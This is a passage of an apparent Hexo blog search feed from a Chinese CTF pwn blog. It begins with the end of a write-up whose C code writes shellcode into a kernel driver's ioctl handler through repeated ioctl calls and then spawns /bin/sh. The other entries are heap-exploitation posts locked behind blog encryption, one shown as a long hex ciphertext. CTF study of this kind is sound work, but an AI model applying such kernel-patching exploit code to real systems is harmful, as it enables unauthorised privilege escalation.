class="hljs-number">6</span>;i++)&#123;<br>        a[<span class="hljs-number">1</span>]=*(ull*)(&amp;shellcode[n]);<br>        ioctl(fd,<span class="hljs-number">0x80084700</span>,a);<br>        n-=<span class="hljs-number">8</span>;<br>        a[<span class="hljs-number">0</span>]-=<span class="hljs-number">8</span>;<br>    &#125; <span class="hljs-comment">// 修改chardev_ioctl函数中的汇编代码，获取特殊权限</span><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆基础</title>
    <link href="/page/heap/%E5%A0%86%E5%9F%BA%E7%A1%80/"/>
    <url>/page/heap/%E5%A0%86%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6f2d6cbfc7f3dd529f6b3af9da5ae2060e0caad683e29bfbfe00a5ef764f3fcc"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击方法二</title>
    <link href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/"/>
    <url>/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="52da15445e99775c8b72280647d01013c9c7a3caf6c606568be4813ceff1bc47"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击方法一</title>
    <link href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%BA%8C/"/>
    <url>/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2299a3a2447aa7bbc570270e9a0f9d8ceb5a0839561fa8d6c25b539d0cf444a1">34639fa829de738e52c108abf4ed7d8101cee9798c814c81882beb227c546c93132a444fba8a14c462be8785fc79f1f26ddb2f347c6169bc9d939ac5dc1893823238e8302af736134cf179308403085c1152bfedb004e5b59b1f494984f283c92b9236f54c7b29a6b4dfc592d2cf0cb146bcf8fa8c559f1dbd7c0ce7f5876d5669f2e14fa7bfa9583a4d8318634636456a40924d6cc88a7afcb11500b32b9caef82ab17c2512a2b65f8fe213215d44c5656310b1734e7a71f227487eb392fcd4ca4b81235a02c8c12104f1c7baba699beaf24763ccec6ae23def9790f23e7e285c1fd66b9ce660a832063e3f28c26528958cb6a45bc9405ff81cace3fff334a730eac9cc08777a5606074fce9078cd14709f73cda42c489859b50844a0b6b69ad1c21c27d733a8843685aa3e8c7f3ab5eb1179e9477a230489021981527164d684d94da81bf5561461cb27d41c140a28270a69d2c52e140ce6484c1c6747de3f3d36b3cf15082b87ffa14b73701f89bc0a3e2815572cd60e52e2c2104cf924a7c1f367074c1b81750fc3b985cc692c6e60bdd293ee018237215e98ea0fad412a11f5c40af43e720f6f5e280ab26bec09c31bbc5751d34bc61c4a4fb437d8af3e77ddd7e213a7730909b00ed6f2feb133b8758448a54dbaf7583eb9cdc29020c37c74670f4289cc55cd6be1aa4c24b63314b5e299930c6d82af7f504a6d0797ac0a5db9d4c25049baa23e2f6489bef6bd6ea68735b2b76800921953327d7afc1841512fb3784f1411927f4ebe1ac47b3f67c2bb8cb3974a5ffc84f748a603a1e02d905f5f60415cfa8720eaf98ee2626873edf9452fe4b4bd020d9072f867d3ca603416691ad841621ae6c25b0dbd701b5fe856df43a43afba55a1e1dc1189ed219e9de6ce0317f8f77dcc1ce8d541392be2c5b0391f1ad649b74e66ef37b61071ab3a4ae6e1633a5dae1ecd23159583db530f12a70b5f2b5d7599e4c53a1accbfc2e3eeb56591ab5f1e18f328810ed8f896cdfefb6b11d209016c8d0ed56dd5ca5b657c58550b28696e4bed89e3df2df53063a7e306fc82b692e257abff98a01fc97211b975f44e255800e2fd7374f6eb954e1c2b5d5cf709a32bc9a183fdabd1d6f18c45cd9e839a099ed8ecb4b8945d225eae8ffcce0dc16ddf787045e3583665015a8f277fd3143dff6db1fdcd258303568c3e18478b58c601d313848790a73f4f57071a9a8aabf7b4d668b91cdec5ab7d316c7d83133598bebdd401acf0000649cbfe3112e654c90b9ac4b9a73812484e3913713d5e8dab679480d5922915045f21bbbef86412de02a389746aaaccf6e03fa25af10893746a497cceb4152390847ba8c2d2001d69062d66b717c47802cc1c906622cb1d7c6a43cf84cb47fd0d2cd41886ce6aa33968dc6faed84c1752b9258ec607b10b59d1952bc013de24c0470457ccbbc59b321706202577becaa15c9fd6b9dfe764d98aff4553dfadb36404e101b45d958e9c86b6c520794f59a0832940c7a8fba82ed14d48822131329ed56d6fcf81e886fbb458c9fedd847d0cea87dca954d4ac816561d44c36256a52865b05f53abce4e97e7d53154bfbca778b0299bd8cb915db457e4354d3dee06ae384517dd5cd04777c7f541134138da8b3e5984af882e8518e96cbafae519faba39091f9c789bb78a2f621d1d677646560d8c70e1e993d489fa9de519c19c02343bc15d9ef6682eb2445f31365461ce8577a0e1f385fc858cfa93c1dfd9b042c3f1b4ef3984a74c97bdd7e93f995c5a54509710effaa464004033416fbeb0380c5c1c46680a7c31ad20087662783b5aa7585321e450767e89d0ecac580c5d14270f9303e3ac146cacf84af3b0cc17d644bd224739585422844f449c0ceacb5ba04c215eb80ff42612495c138469b24a9e4121cc11f679b615abf5b4f01588f6bf157738f90e7a014e733d597420815e299acda921ec9156e7cb81990210536000ba864e926bdf2ba25ed2c464812f4e529e730ed66bdf3d5ee37e52c0df9245bc9c2dbe09a15cecd4db9e12b29d7563f57f421f52a85570f0389d29c6a8db7b0cc31e9534ce85280277d87312a41fe4dbe7ee42435bda76c671e31fcec2670bdf85389516fc2c12c38d4536e8b51d3775b6fbf96015c11a89c2cd5c03d01fb299512fff335b12599808d63456de4aff25c3ee70f676dbf51d8b307dbfbf8035f3e6abd9571a0b8a6030e450511c98c7723afc719177963c6c68358cffa8ad418ed46b3c1b824e6a087d5a83fbf0d35f549481a95ed9aef298b2bd0ff6ac6b327565eb6816d3faab25e6d61007fa3c309172fe7a594812cb69308397033ce6b8d75e991a503e2acc1c36f95c67326e3a65164b5c30cde937c9f30bb9af9ee91860812e7a8f6c606af65fc19dab42c5fc9af71102384268c36616afad75127104b8d6dba8102140665292ba4b3bf48fc4b9c5a05d56020d564915541580619b3e7bbae7c447f9698a15814d13f1b0a803123171eb58b168679bbb99df73f7df27fdf4fc4dba324a5dd92d18ee2b6d0d542fa11a7240fcc17d132a52d0dfbe758707f62b29ab974220c8f5c82875183ebdda05c3d837904a48eff63dae88b7ef692068978bc6c1a9192ac6713fc9d1e2ca65f7fe4de851fc646c61311b62c42a5ae533a9c0ab7468948abfd832bc6a5630c0c1a77b6c42ab8b42d004f9bc3b2411eea3ea87686aca24a193c1ca2f95e7839e40bf8a1c26057e32ca1bf2c4965e9691f0351b592cd62508c4127eec1ebaedb165f76bde66c16aae32d1292a347ac01315d6cf14ad9028a9e64940b661a893465816bee150d8fc2d391eb1fda0d27c92675835131a18de5809f689c460c1e99bab982ab9db1c924e21fcde0754157ca0642f3ff194029deaf2aa5e977e273d1cc4b4b1fdcd606f8d79ce787d2ed4def902fb11cb295243f70786411ee4e0327a15c1d37c104ff34462a72947c9888eaf4bb3e0f71b7774dc91ddede24c6f322174171c7b273daaa3e082acd7d4936e3d098f34d2b3e6b933bf24f65d26e796e41659cb84cf258b24621fed6cb7c73ff99472d658985dcf7278759fbc35faf8da006901388ea43b9514e068fc2c820653492c288ae86c56fe3be7ba4169941692b7fb3a5926da9c6de74f96eb7430bb7f9386daab0000510ae64b5d7d7306911a1ce97dddca5e84337afe18b652d77040a44fd28a0714e636ddda331018e61628f756396ce559c3d8f8861efd813a7d445c6273da370050daac7019cd9b986d9cd017ee8af158f51e2a433a29cc11e0d863f1de4012fbf89b71f1b18d4fc8f1c2a6862d278315c1d6a3640e78f5f5a3b5bb6f5db28211b760e7fc572f370db224f2cc390cfb51a5b088a3eec4788a4960475f38352324c1f659f7eb272bd0b4886cbc43824762f5e7fde529e94c3a95298a540914ae9f3861de6bb381041b404c89e7d66277be3955ede2d67489a7e8801ebfb65538388b1b4a8d781eec12163617e24bae4c357a7eaa8f752160dcf4fb9543b3a58af3955c7dd42426ad3ef9e12b960a70dbe445afec3678da24a552cc4bb9ca87ce05fe32318360aa0b441d87c22a9b9200cad571627129a40e2456bda28f952d7d47af42edffa4149a76fca08c51e64dae7baebe063108dbb0b91c3a7726703bc1eb4846f03da784e49cd88c9b4843d5510dbbe2dc547e9b2af92fb888208675431656dbb4c77f46216a7d06de863939d22aafd3ba4351cfd2b1f5e578d807d9d0dff2bde0d81a27077322203ac4ede058fe32ae86b7ad1864c687d57bc9f7c9fe5467c046c29f9736a0c7a7067e99a11e10c9c56cf88028f1508e7447723457aae1fbe942dbdbe5aaf972046dfa72eb27c2a0d4e83179b9df57d0ebf7a2070329e3ff5298991f8558a859c47f7bf3b5b29f92d3d7b23ac19123d58b14ac1bb2f652b9b682234a6478d2936469376fb00c101ac600cfd727b6e786843ebbbb0a3e752b2825e6dc8c2f7de1d87ee62fe622bccb00d25859bd94c33546fa622bab976d217dd90b0989aaeb673d43812af0bd041005d299269869419f6055d615f0cd84053b9b5435d8e1666cb2abdb729d8dad04f7d59e20fbc1ccd701f6ac042fdd5eb7a621b7f200ad428a0974ffb40ef3594c3e21bffed35fc5aa8b8be2baf64d992d548dd4f008f94e187b8be0356f5afff4ec4587517ae729bb56809b0d709e5f9b79afc8af63ac73f6cece0580cb0a27d32465143a3b07967ae7fd059b0fa2c128810b7eafc84e3e3859df9594a5306dd014af7043fcb396fadd57f1fa88de79c86fbe64b2bd77ad8b14eb2cb530495a24d9db8b610c366705433b61aba5d9f29648d4a06e55f0806e4bd4df10997322bbec4a3456afd8e2421341f1c6d6c5a89a31fcbc286e438a3554966ef56965832a7ed403be212e558126514482f01350daae09a1c393ee72661b2824ae39964a8520b6084a8256a6d690432c494d3a629528d9f62d4f80c75a70a2f90b852523065a3fafb43d384b6189f747500cdd0e005ce3bfc8110543ee6b932f28241bafc6bb580d14b26098e9184f22e4349c075136607782602cbe556b49e98ed98de1de71290ba774236793999b88827cec67b6ec2b3391c76036507fcff7150788ffc4b1b73d4bebe55f807b8d9e6e9ca206afdc3ca650aef912fbc8a5081642841c21c46706421fba5b57326084038f40e2b559eef190a45d8cdd6530c7f231d9dc9a5fe36fe62c2694d9a560e869ac697e8e94c27d1c2c81ff421b002fcc2857fd74de0b140095c1d0b69c8e22ed95d8fb445a2bab63a68718c5b647517913a88f9be582bda1e78f47b7d08b3e826f150bb1ef336e99cd2e1af6163bc12c6ad60ea52a1b6fa2ec6d3cc3c28f1c6f8bad2a660b8eaa7380b58ef7bb710ee2d67ea0f253c95ea5dd023c8e4245659be0be57aeb95f6232bec373b446eb872e57a7b89e156e85f08c5dc9eb055b965595af8bd07d9c9c9a05e8e3ee73de65a7eec14e786a21aa2ea58157f24efd11d42af76eb4161773e606470ede90b9b5f0c66f0d6ae8f93fe664e3bf8a821f28abdf96b42411e8a5352ee2c8afa85b2557499caad455a9adc2d26ec37732365ccf1bf30f52acbf5662693949ed1d0c82adab1b71146f70d779acb497185d3c1538aa63a2dc0547a0bc4cbde0cea9e17734a91d9d916bcefcdcb456c156d5d5d800503a4939839453c80a5b3000f60c99d7d9feed08d46d6aeea7f281841593ec052255becbbe47ee14accdaefb31e63b896272b03123c25a5eda5a172e5e075d58b5720a81b87deaf983795af241fba7677a68eeee368444cc762020b71f3cbd3541293784dcd2cd651113968dc6b76ee7af235f7393d252e066d2c19e56bf2cf9b7d122476831c8253b905b5fc25826c8ed4e8f83104ca2223971b1639084bf5c5bfab45b6686846cf98bb40807130be8c174f285544f910f0fada1bc6f807caec80fc86fa1a1747eac0684b7cd58b5e03344e9030ce18284a1d7b70385c87b97e182c1ee1e8c5ed29f34dadff26930ec7229128f9f5e4f994ba109b05473cb7bb1f79567f02f4e879cac347cb6b4fab7d566419b649521ef3b310e4a2be741181f2306dee0616667f04e69a3e99d18d8f03bf64d1dfedb0c7bbb94c5a251dd620ddfd426de82eb15f4e89358c738c223e485e8181f24d479e55902a7be7c749ddfb4316131a6290f16ee530cba2afacfabf072c21365e3db779bb72f5df95bd634e433242d2b4a1a2c5aadf74175753581912c18a9a26eb1378b3ff1b891499e734f27a49b863a8675681cffa267ece78ae698b5886d43418218c83cd5b1209d610e8c8211661b6b0df7f77be4d8680d12972129adf4dae74c1815ad5c6efefa9d06b8705087da93f2c3d97b39408094eade3221a0ffed7610225e5c7386456b3e23e45cdfec775c85e590fd4f331f24f0d69b03dedde2be2e21f8fe788de5121f9860dc7eea89daa1fc41aa1bb17e84d3d9b8ac099de917156804a0d9ed8d97f9fdcb1f0618ae925105ce6b7738e4b4828dd513dce68cae4b26346b38659dc42b24ccc2d99dc04eec8a17055e12bd2837918063f329bce76e924ad649adcf83c8c074b8bc3435af0d3b52edb5ac59fdf931f42985a9017ba5ca0dd0afb15d41a8f4153c1a8247868b499e8c747889fcf731ced1530a3f4509cd18cfc209fbda1779e1251dc8aa83408c7b6cb65257a29c1db5ff94f557065752b2892fa370b1f7fc4b4ec817954ed7edb2118d5f872f76ea58d6675f290dda32835096ff9380a91da7bf60a5eea58d655cada64f920e353990b9e6f78f9f678077359df1a02312bd0b493a9f7bfd690e4a122e9f64d6e8e8ee4a4d599f72d43bce21aa83a8529e8cdeff94deb28e44b96042e5206caf58917ffa85fa5aa4ba171d4ee6d7438984e7ac40502b7248c7450d9734982c7d3e99ffc5b3be38884891150a08d801ebbb3dc751cbfadc024643bcffcd78fc36d4b07194359563a6baac40c0a58b042d427df5cc13246371bbd22e972d370cc31468cce25c9430aae5bd6cf37b4f30aba16805be615795a55e9d89888e39408ca743188e26babbfcf5deb0dd6003707342a96f1399d204950ac9e74335349199d5e0bd48a77b289cbb00c5371661f732fe46247bbcdc6eb0c521921de3ca832b827c335140cd9a2b85b3d726a26b50371394969eb9efef950257e705efff00287e5369b25df22e67843d2a5f457c4556ba34e914aca97541d02eaa504bbc36265287618741861072c9a81da0d663c7f8987d0d965203697dfd154875da8edbd8593f18092e679667fe2b30fc89e3818642328f8718fd392809564d68f640af21273d7d302a9a16b8c48b86faceedbc9bd4ba9d3ef072f760dc6feaab69ee15e5adaf904ea0c6856bb2b8803239807c356f6c8a897e705cb57b939ecddd7e24bbc5f0d9535adf211e075b6c28a92113b730108d39c5d69282f381586fcf63197427e0732719a5c05144278ba636ee8c41b76a438356ee89b8af8655a45513731bf97ea686b8ddc5900ba642d73cc71a379d2c64fc743d9044ede215f4f3587b04d2a1a86cb6242e7d89a8e99dd8309f7232ac5d4d0116f46bd4cb6c7cb1488e33bedf08691d90cce94d760feca3abc5cf61771d4f64c682c265183d9d7e4b4d2f5aa531cc59400037ffb7e5c511e098ca665c2506768f6b93cc41fe1eac2c08ecb7e4d3a03e64c44c7064b76a581ffeccbe136642d4b25f22bb379d58577e559db8ef239aff600781b2900ade437b6339fa368ff849285033398a31513c5e45323375d11627bfb9efd9d290c9171326da99da084b3af948ef23c74918bcbc002a27d18f51a9f4bb5bd78c0922e437d1a914ad615ddb16e195ee8e470588b533b7103fb9e598f6ef6d467f688a7afdef95b8fcd6cbd645f54b7f92a2f5a1af1b70b49f39fc748e69509046404495b80e55ccba0d394a76b5a9957387a8a0b792547166aa18e2f270afab780ade0a4e5cd5e2f1b89a5974f5dde484cc45d3afc23ad2382b9b3730b3a941d4077afd51d7e2eca6275734e8b56b149530a54b6a307e4c8d4cb01c9ecd1992ae10fcd32e51f6de8fe7c12589538d6381a4c118087bc5d1a40734c9651b4f3f64c1455151bd8d81fb229d1f69cf9e9a19a8ed3269beee25191f403b048d4ca890d06c9b8c26792eb6635483cee62e6ba0977f0c725f893a01885bf84440499785c303b7967e05b6a40efcd34c5bdb3d795f10945e5b3dc52314c1054925781508b221eb2a1730c475320f269e8b2573dd95d690f4d846e90d8482a890f12f05d97ed093ef46ae00d9e7c1685bb6bf70b2ac5ea4b3481b905897dc82cb8bfde37154e939220bb5edd53be98ad545a8e980f26722392d9ae2a4bca87d7339c59f8acd2fc6a904dadf2b823de8ac97284449178c577bfc3bda1dc264e891dffa7f5d2cc8ef041e4ef5307a35036046806f3ceff9ced339e30c7a494302301cc8bb3477ab8a7ba8415e95000d0b2f762eff4636ffdfc248cf7f1c4b82726635b34070053cd5c95d3093afef3ee16524d6b3ec0a9b66e2688a607dc3b4e0a93ed26510c6771ec612642d1bae2a34106230b76fc62cadb485e31176662c962d068d35fbb9ee62d4e431cdb7a6cba710ab22d69d6dbcedcaeb298a491ed82e4bfefcd11bfcbddad0c380143cb3eed34def1c9d407d11abd4abfd2832746c0df8f152b0107fdbfef985adbafdf7601e502100be5c7fa9a4deac2db6da9aae7a0096c77c214cb92add40a988f5fc122876abefd21944e6f53a2c43f67f20806c38677bf5eec0e30e68ed49906bf8855a8b182e21ea066d591842118270cdd2ea41e7ae0a0f1087c9aa7d74c1dc361c4e39049169b405dd88368235679ee8d569f83287484cb994da9dc34e578cca11515592795af89eaf490dee717316ad92f3535eae9e4d70317e8a83dc5307d8bca983bc2e73ef84d8e49d770eea047db8a3cf92bd7825d8e294208908ba0fccc6c5e663c3487b3470ae2b93dc1eb4d60f8808af9bdfc4b3411a962a4596a0510ac16837743b19a8cdb8d2ee566041782784136ac6741199475e307284caf773ba6972a35b4aed41b133ab278e445ecd1b28328a353dec9670181159ab0c04cf5902d8155af9058c0985c16401e6990ac445e8f66ba82cfcdccf90d0d01e4dbedec65141cc261615cf8d46935872c7085addfba0784028b356d2325f113d6277be3f66a36d83446534bf05736a5c6d0f787188efec7f251b2844e8e05fba58cc1a6268fa6fd15adac42ba94fb29a23ec62237661b5caadda0b1709f91666a20715c8ae345b646c1184c0f9e219ff995e2c75be4c5311cd8f5a67c8384b66ff0003d99477ad2d7f4384de3468a72b161814cd6660666f9b99e5498009d34353e07e923da7380ed701c433825e3c880813521b12703201fe75b8f342bfdbaa24ad881aa96d1120c3ba2f183633e6d7db53d824f8a96c82330f7696f1cb2c83450950ed7c4d396e90317e54992449ae3fd2ec72edae196532c96b226ea1ecd928a70d2fd7a700a389c7494ef03092d782332749b06ef1328c91a79ff9e7d7b1235a0f4a52c8477d43ff6b2b7a4ef8f3982e7cd7aca81ee6347c6344985e51f225fc67aed04112e26bfc5f799b039134c04e117fe1488c8ba847855b54530d0c153227a61bdfce9a1b9f08024ee21ded09dc22af402d4388ae2d5892067757b8b0429e86d31bcbad1e63d6a3ac438d88772d6fa8daa2e69fc3e4801baba01094934edc7bd133b948d9e1c24ec88d63253c013d4dec967bd94d83996e87ff5b7a41a4f8e99bc36ff236cfa25339956a5319aeca6ce8b7c98a77a47c059b9c844622c31bec8a1b4bcbef262c08d068a849aec73e032eb0badfd54b03ffb156903eaf7ddf9da6d0b0ba47096787f4d85a5054c5a95b390efb4ee0c4a2b224a1eae232ad1cb80725865997b937c03e6b16291e10920f8ea3c66ca3de596e2269153e31e3f0130723d4c22c4a198fd26584eab87c02be076bab5b7a103eea77d83725ccf8ac38e71aaca4fda8138fc1d8126be91db754a792d523835d1f5e7d64bc8a184bb0eb3ecf8a112ca695e4267c94f94eaff1ae2eee85042beb11862ed9dff14a89a57c8d3cf85afcdb12134371626d3b97a9895f554206a4c0ec4cfa49a809c06d889240e2e579f2fbc1635a80ba2da88554c8713e4964ce7714ffd2e0bd8b94fef4a1b7dac4612504d227bab6a3a618ec798d8beed46a1d41d5cde0e3141d5a089bcf17666f496e50c43e714dc6bcba1428fa4ec5ff4a4236a2027f6bbb0a67c0f41ba2932f209b074670e0d9fd272d2e796c4de71c52d3b4ec8f40a2c8d149a421de535e42b06e3b94a9f76df4333d6925e0ee892e1ecbd9a6be81c9ce3ca187879ba191e2a01b607572143a7aa4bfb39ab6f3bfc71628b356fce5b87da651143d6dc4028662a1d102f6f1dabce412fe9b4c90191a1fd86350c3102638cda573854af22500fe6767502e9846f452cd8ca709f4fd83e33818b74f985424469333089a759e7f8df360979f94515295bf09c2f7abfc7b59f2d34b53bd2ff63da04dc3ef9bd94bea55e5457ac515097576ae6d48735eec45a3701c6810571892c0e73ec9a3cfc7098718364b97c9c412be8e27f463eb29292fd0f31d3b3eea4e9b3aa947bf2c06fdb0567c759ee93b97d3cae3904080d225795421d0025185d3c7700636189493befe3bafab70b1d1b88d2a3e0cacc1482471e491c7690cfbd3aa21a2ffc745a2a524f2a5ac22c6f8ce5a7ca07d3f41b36365cd3b47d34fccacd5c59addc8db2ebeabd29fddea296d5d15c0f57a5e1d43eef1c1cdcc0110b5155cfb4c0a30e46e162f8c32425173de824243cceea0a9cfb306a0c186b55000bddf6df029429764955ae191c1a7aa4db980c7c104a87ab3535060e0ed6d6c686ced2ed487e054a31e6ef48609f818ca5151904339a63d21fcbbfcab006f5eb6de869bc48cd7204dbeaf2e5a406d3b65ffc82e856a07f6a156e88761be5f7eb86ec5e05b9af614ff50b2a251fcdbe005d415ec58b942dfbb37c3361533b7daefb9cba62f8e9ee4510ab2b69656bc1131c75a8234acce78e795c0bf6357c4516013ff558f25f705d4253dba54e233d5626d7d0cebd95cac4971ac93f43c3488d23a0a8dc97863765ba78b26c879829d578eb88533aa90e0a214b69cfdf1717d14e62bb654166c1505231fe9abce7828aa3394f90f3dd21a2c356e10b27b800de5c9be40dcb16c11cb1c1b5384f20118159e8234dec7aa05709d179f0c5d2f8efdb77fe284ed9434ae75a330030211e5435ac83678b82a3868fe33ff1ff33800c030bb6e242a834833d9ce18d01bb8245f888baf8ded192b5390f28c2a42d5f26804bb505db223e266cfb59091e33692edd03301d83333ce913568f9c7fe1076c778dc73f932284ceb8a0ffecee98c2a4ddd0e5f0ec8f8430a46e121188002559732149195aac415d6f0a14004d18980ff9ed8c466b019b2e9cf3d943a68a460a681038f19f1ea7ca6e81932e3b9dc33d705c44f392ac2f903f981cb08ab4cd55b56ed5e0195d48d71e86278ca8db6d95255abb0c781b802a570545b55f13bdd842587847aa5e399d0925cd1d61e6baa11c8567a6d4a0956b907bb6cf28c1054b93324b1eaaf7c5339134345ea179b7a0538f4150caac934a23a83e1dab6b5a1dc893a53160cc082bbc0df2e30761cb0cbd0d92668570f17dc477a6d0128cf91f07608b89d35368c25bf05242a82e0010c0e00cc90e79ccc52c7564fbb55e51982b5874d2890695951f78092c4d136ac38e7c805a90e32a8d09ca588a77024d47528f37e7f849f719ecb41c32edaaefb5a398b834532f085c98f5add6f591ba9c068174f1bbcf1bec42f8029a3dc70d4209e0a1ad58b385e43ad83522a233578021902579d88fb8fb4dee39b7fb5de81af90ebe5d12a2bdddd525677233dfebfd28e8c7dd6015f2902e2a51d296992077ea97d2da39a1883b23a0dd4cce00e48993a38be7f1c73ecc8b73b4332aca4c5790c479ba27f714af54c831c2b278ffa8b98690480a41dccd7d45e81591c405083575ff788624c1bfc5031562c8bc619878f66832534a67626937dd38fadd6f5f3cb489ccf56c6b95952efd8098da2833b6a252feadfd7b36816adb2bd1735c73b60686407a25f7d2647d80051225bfab2ad0ea2ef251b1fe686e2020c573e692b7d5bc88f846c947efc184a6d04fb904a3f8e8f13d083cab3c800d23dbee2d57d83ecc4b46344489554a0e03b9eb73a16ad2e979e5d0599c51fef5d2bf1c7177ef704997da026b95706dc16c68fed6c965d561f40d8f8f47de5900cbf0732f5a84e5ececa6123af33048104b3e66e165e8b83bc6e66d708667884845a1cd1a9498dbd4ce96da4d1930dc528c3cb10a3bbd999b627f60a30973fac99dd94c9ec14f91fe23e794628963d09d5a8056c8d306a4e394c06463947f749597a9e467b180618ab19cb6b51dac10fc6643d90df4064373dc6fac9d05d7afe3d7885bbc3c556c04b55a4fea273903fe5f2cc92617c95a3ebdc4d62121e3ae36fe223e2f26167d8c639897cf544dc30ba22c0128620a957b29164e8f7e7c44c80a97ff89ff92d79285a88a6348aeb4a1f02617d04d5d64a3e7c50c11ed8df44a6f19e510dd2a152f96beebe69b3c11257217bed716eba4d2dbeaef4c055c2c14f2cbf0190cb8837a972fbe3a9000b849468c5ec8ae484ef8ee003a66aacac057a72a35312fe96f915e3b42b2a17bb56e6618f4edb673aafaf63dfc75345780d98f1dcbb65dc1fdaf8b5284e31ada25dfc396307269b11454827f4d74e51d12036c8789dc8321f78c2c40ad0bd4ed6dc28c0335f4cf9389ed230ba75d388dd16a6c449e4d9117cea99af8a0e52fe166e40d30c8bde8915f1f60ba14b09d8e49e33678c9e7293c8203e6c9afaec58b2e5076adcd4a9ebf0112ce97b19363ea0b2bb0b71c994ab09d457e44f2725c25a04a8b080378c7913bc9debbfef4730576719df518244496b6bb11438854032fee12e8c65df6f819127b017265ff975b66b62c86d8a873f7f7bd9876ab0ffa5f6787398a413067f90a2b6c90f21e6fc474ff2522bf973e9a6016d455b4edaa473009f1fecbf5709a0a423381344e0060f77904424cd323abe0352c087b1c809a78b736352b076f6d6e308ee50bf53df235aca92e3dcf4534402de906b8977e13a1f85fb1ad80c4462e7e6b4d4d8509bb7fced175a597417232effa805dcd7d4b6341422f786fcc8158487d866c11701c492a35d50ce5ec51ab12f5871cf2e4ac840c28571d4ef290ab888d254d9955c9d2b5f526a3b9aee0de12d5485bbd7e72a87effc4de337fd44ff3cd0d799e87f3ac034f6238de0cc98e13f2b744252f288b8f074b19d1862cff76315b503c51921d00b10ba10308fbaac0c0879812dbc1c7950b79089f1bc86e60e4d909dcadfb9b718f6f52f3a0d97a6e46063ce4e82827c2e7a5028e4c778e283fb56f1e7a257d2c6bd9c7547f0a0bbcec310ec57ffe8069a1897a77771915e8eb6d86b7142fac3aa7d7dd31be7b36e0d491d6e6f1a5a54418dbb0a72fa0e6196317b950e2dbca4755f781a213b19b568a2a484cf0f954b3c25f694a5461435016148cefaaf2edfbfe462db46320048ce3e4eae842230edef703fc752038e680e6ce67c8e40e3f15c5e26a549b4c338aefd77fe77ede2aeb5db6e75195e0278b85688d4c101bb43a49c624de338259ade88755358e997bfe57ca58a41466e473e0b00e892e020aa3f542909f1bc937177e8ca3b38b35a3faaacd1c79b64b25eae5b9b8b3f823eb9dd4357b81cb1e061568f65b31085c552066b0075fa284844facbe9752c38bff37f2bae5fd40d14c206061e7e0c3bd78106c56811f2fd661c9d407c9421ff5aace3a973b95da48a500f33f3a90abd8d9f33653064d9f3a53db6c29c1da3496c827f05c807321f4ce27a45612eebd90034ce4ed45d4d7c01c2b0a1fd83927ef0c95a50fac7fa42d1cc642e5c2a648144294ba3b60f02e824805fb2e921ba3d9f49ba60150b4d629a8da217b058faf8dcc428d3640a172be5c7850be18c698f8c77c638faf58b7ef5c0ccc80fdc90e7ccedac4e63fd5ea6fe72ad8b219184b46da7259c38009849cbd624c6785c8fd5d7e7baa502820450d17e6987ca5c2096c254ce0ddcbbf3a471dba431eff0badb8acf5cd2917406c4151bd702ea2c54a0376da286f181d5566d2a245db639aaa8dee750a1660d96988095131e715033a66f756d763a0f55b7bb58d0968a72f1db71c5ae06466215b381d07d8a65a87cab8bd131ce71e5fb6073ecff1c44932b7f801a5ed776a61d3db674e3ecf5905335ac29325498dfe9260b75214623098598c34c046b393d4859db245864030d710e88b1097f9e790c68ed4c19c0b07767e010aafb7387d375d59e5e0c8f5fc7ec268b2f7ebeea576769ac9894d5f08d97416ebe3006c00b9f64aa63b11b38869a582f52a031806c87434bee4865801613eac0227ac22c7d2610bf020d0a2e4358359cd0cb0309155c42d6edc89908e3db1cb1f19e644e98ced669ef5863da06b4f59fc084e1b34bfb8534958a3a25d38334e61084e1924d39cd4e4c07e2249877401db6ee26ec159b4becd400bb555521ee72e4c6fd3aea15bf1c2751b88776250237c60422d00b44aefb592225fd6fd38e01ecddf11cff290df65b6efe49e3388784ed679b8b8a993f9dee3bdf37ca0dfa2d881b0baecda3035991be46af18b57f62b7801cdf2bdd966bc4202d9d07db2457b6cb98b192b4c7b3dd30aa4a4b79449cdb423c1f7fa14f17065f65acbdb90934bc2b5fa7a8